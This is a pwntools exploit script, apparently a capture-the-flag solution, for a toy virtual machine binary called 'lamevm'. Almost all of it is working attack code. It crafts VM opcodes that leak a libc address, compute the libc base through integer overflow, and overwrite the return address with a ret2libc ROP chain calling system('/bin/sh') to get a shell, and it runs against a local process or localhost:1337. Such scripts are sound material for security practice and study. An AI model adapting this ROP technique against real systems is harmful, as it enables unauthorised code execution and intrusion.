from pwn import *
from icecream import ic

elf = exe = ELF("./lamevm")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x1309
pie b 0x1179
pie b 0x1228

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# Structure tl;dr
# First byte: opcode
# Next 4 bytes: arg1
# Next 4 bytes: arg2

def asmbl(opc, arg1, arg2):
    assembled = p8(opc) + p32(arg1) + p32(arg2)
    return assembled

# lower half
# payload = b"\x02"
# payload += b'\x92\x00\x00\x00'
# payload += b'\x61\x61\x61\x61'
# # upper half
# payload += b"\x01"
# payload += b'\x92\x00\x00\x00'
# payload += b'\x62\x62\x62\x62'
# # incrementing thingy
# payload += b'\x00'
# payload += p32()
# payload += p32()

payload = asmbl(0, 0, 0x92)                 # moving libc addr to r[0]

payload += asmbl(2, 5, 0xfffd6270)          # moving lower half of negative number to r[5]
payload += asmbl(1, 5, 0xffffffff)          # moving upper half of negative number to r[5]
payload += asmbl(0, 0, 5)                   # adding giant number to r[0] to cause integer overflow, making r[0] libc base

payload += asmbl(2, 1, 0x000000000002a3e5)  # writing pop_rdi offset to r[1]
payload += asmbl(2, 2, 0x00000000001d8678)  # writing binsh offset to r[2]
payload += asmbl(2, 3, 0x0000000000050d70)  # writing system offset to r[3]
payload += asmbl(2, 4, 0x00000000000f8c92)  # writing ret offset to r[4]


payload += asmbl(2, 0x92, 0)                # moving lower half of libc base to retaddr
payload += asmbl(1, 0x92, 0)                # moving upper half of libc base to retaddr

payload += asmbl(2, 0x93, 0)                # moving lower half of libc base to retaddr+8
payload += asmbl(1, 0x93, 0)                # moving upper half of libc base to retaddr+8

payload += asmbl(2, 0x94, 0)                # moving lower half of libc base to retaddr+16
payload += asmbl(1, 0x94, 0)                # moving upper half of libc base to retaddr+16

payload += asmbl(2, 0x95, 0)                # moving lower half of libc base to retaddr+24
payload += asmbl(1, 0x95, 0)                # moving upper half of libc base to retaddr+24


payload += asmbl(0, 0x92, 0)                # add ret offset to retaddr
payload += asmbl(0, 0x92, 4)

payload += asmbl(0, 0x93, 0)                # add pop_rdi offset to retaddr+8
payload += asmbl(0, 0x93, 1)

payload += asmbl(0, 0x94, 0)                # add binsh offset to retaddr+16
payload += asmbl(0, 0x94, 2)

payload += asmbl(0, 0x95, 0)                # add system offset to retaddr+24
payload += asmbl(0, 0x95, 3)

payload += b'\x03'                          # ret opcode

sl(payload)

i()
